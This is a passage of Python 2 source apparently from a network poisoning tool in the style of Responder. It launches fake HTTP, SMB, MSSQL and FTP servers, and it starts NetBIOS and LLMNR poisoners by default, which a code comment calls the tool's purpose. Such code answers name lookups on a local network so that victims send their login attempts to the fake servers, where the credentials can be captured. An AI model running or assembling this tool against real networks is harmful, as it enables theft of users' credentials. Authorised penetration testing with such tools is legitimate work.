             data = self.request.recv(1024)
          else :
             t = FTPPacket(Code="502",Message="Command not implemented.")
             self.request.send(str(t))
             data = self.request.recv(1024)
        except Exception:
           raise

##################################################################################
#Loading the servers
##################################################################################

#Function name self-explanatory
def Is_HTTP_On(on_off):
    if on_off == "ON":
       return thread.start_new(serve_thread_tcp,('', 80,HTTP))
    if on_off == "OFF":
       return False


#Function name self-explanatory
def Is_SMB_On(SMB_On_Off):
    if SMB_On_Off == "ON":
       return thread.start_new(serve_thread_tcp, ('', 445,SMB1)),thread.start_new(serve_thread_tcp,('', 139,SMB1))
    if SMB_On_Off == "OFF":
       return False

#Function name self-explanatory
def Is_SQL_On(SQL_On_Off):
    if SQL_On_Off == "ON":
       return thread.start_new(serve_thread_tcp,('', 1433,MSSQL))
    if SQL_On_Off == "OFF":
       return False

#Function name self-explanatory
def Is_FTP_On(FTP_On_Off):
    if FTP_On_Off == "ON":
       return thread.start_new(serve_thread_tcp,('', 21,FTP))
    if FTP_On_Off == "OFF":
       return False

SocketServer.UDPServer.allow_reuse_address = 1
SocketServer.TCPServer.allow_reuse_address = 1


def serve_thread_udp(host, port, handler):
	try:
		server = SocketServer.UDPServer((host, port), handler)
		server.serve_forever()
	except:
		print "Error starting UDP server on port " + str(port) + ". Check that you have the necessary permissions (i.e. root) and no other servers are running."
 
def serve_thread_tcp(host, port, handler):
	try:
		server = SocketServer.TCPServer((host, port), handler)
		server.serve_forever()
	except:
		print "Error starting TCP server on port " + str(port) + ". Check that you have the necessary permissions (i.e. root) and no other servers are running."

def main():
    try:
      Is_FTP_On(FTP_On_Off)
      Is_HTTP_On(On_Off)
      Is_SMB_On(SMB_On_Off)
      Is_SQL_On(SQL_On_Off)
      ## Poisoner loaded by default, it's the purpose of this tool...
      thread.start_new(serve_thread_udp,('', 137,NB))
      thread.start_new(serve_thread_udp,('', 138,Browser))
      thread.start_new(RunLLMNR())
    except KeyboardInterrupt:
        exit()

if __name__ == '__main__':
    try:
        main()
    except:
        raise
    raw_input()



